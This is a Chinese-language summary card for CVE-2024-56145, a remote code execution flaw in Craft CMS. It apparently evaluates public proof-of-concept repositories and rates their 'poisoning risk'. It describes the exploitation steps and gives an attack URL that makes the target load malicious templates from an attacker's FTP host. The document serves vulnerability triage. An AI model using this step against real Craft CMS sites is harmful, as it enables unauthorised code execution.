## CVE-2024-56145-CraftCMS-远程代码执行

**漏洞编号:** CVE-2024-56145

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Craft CMS

**危害等级:** 严重，可能导致完全系统控制

**影响版本:** 3.0.0 < 3.9.14, 4.0.0-RC1 < 4.13.2, 5.0.0-RC1 < 5.5.2

**利用条件:** PHP配置中 `register_argc_argv` 必须启用。目标服务器可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-56145 是一个 Craft CMS 中的远程代码执行 (RCE) 漏洞。只有当 PHP 配置 `register_argc_argv` 启用时，该漏洞才可被利用。 

**有效性：**

基于漏洞库信息和搜索结果，可以确定提供的 POC 代码是有效的。搜索结果中明确指出存在针对此漏洞的利用工具 (例如：https://github.com/Chocapikk/CVE-2024-56145)。提供的 POC 代码包含 `poc.py` 和 `poc2.py`，分别用于批量检测和手动利用。

**利用方式：**

1.  **批量检测 (poc.py)：** 该脚本用于批量检测目标是否存在漏洞。它通过发送包含 SSTI payload 的 HTTP 请求来判断目标是否易受攻击。利用脚本的 `-f` 参数可以指定包含目标 URL 列表的文件，`-i` 参数指定 VPS 的 IP 地址。
2.  **手动利用 (poc2.py)：** 该脚本启动一个 FTP 服务器，然后通过 Craft CMS 的 `--templatesPath` 参数指向该 FTP 服务器。攻击者可以在 FTP 服务器上放置包含恶意代码的模板文件，当 Craft CMS 尝试解析该模板文件时，恶意代码会被执行。首先需要使用 `fuser -k 6666/tcp` 关闭可能占用端口的进程. 然后运行`poc2.py`。
    *  运行 `poc2.py`，设置 VPS IP 和端口 (默认 6666)。
    *  在浏览器中访问 `yourtarget.com/?--templatesPath=ftp://VPS-IP:6666/`。 Craft CMS 会尝试从 FTP 服务器加载模板，执行其中的恶意代码。

**投毒风险：**

虽然 POC 代码的主要目的是演示漏洞利用，但仍存在一定的投毒风险。风险在于：

*   **FTP 服务器内容：** `poc2.py` 创建的 FTP 服务器可以被用来提供其他恶意文件，例如包含后门的 PHP 代码，诱导管理员下载和使用。
*   **依赖项风险：** 虽然代码本身依赖的`requests`和`pyftpdlib`库比较常见，但是不排除作者在其他地方引入隐蔽的恶意代码。

考虑到上述因素，投毒风险估计在 10% 左右。

**项目地址:** [Sachinart/CVE-2024-56145-craftcms-rce](https://github.com/Sachinart/CVE-2024-56145-craftcms-rce)

**漏洞详情:** [CVE-2024-56145](https://nvd.nist.gov/vuln/detail/CVE-2024-56145)